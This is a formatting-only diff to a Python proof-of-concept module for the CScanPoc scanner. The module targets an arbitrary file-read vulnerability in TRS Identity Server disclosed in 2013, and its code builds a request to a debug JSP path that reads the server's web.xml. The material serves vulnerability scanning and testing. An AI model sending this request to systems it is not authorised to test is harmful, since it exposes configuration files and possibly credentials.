@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'TRS_0004'  # 平台漏洞编号，留空
     name = '拓尔思身份服务器系统 文件读取'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2013-10-15'  # 漏洞公布时间
     desc = '''
         拓尔思身份服务器系统存在任意文件读取漏洞。
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'TRS IDS(拓尔思身份服务器系统)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '21872c9b-fbcf-4405-bb39-f8c418060b99'
@@ -34,7 +36,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #refer: http://www.wooyun.org/bugs/wooyun-2013-039729
+            # refer: http://www.wooyun.org/bugs/wooyun-2013-039729
             hh = hackhttp.hackhttp()
             arg = self.target
             url = arg + '/ids/admin/debug/fv.jsp?f=/web.xml'
@@ -50,6 +52,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
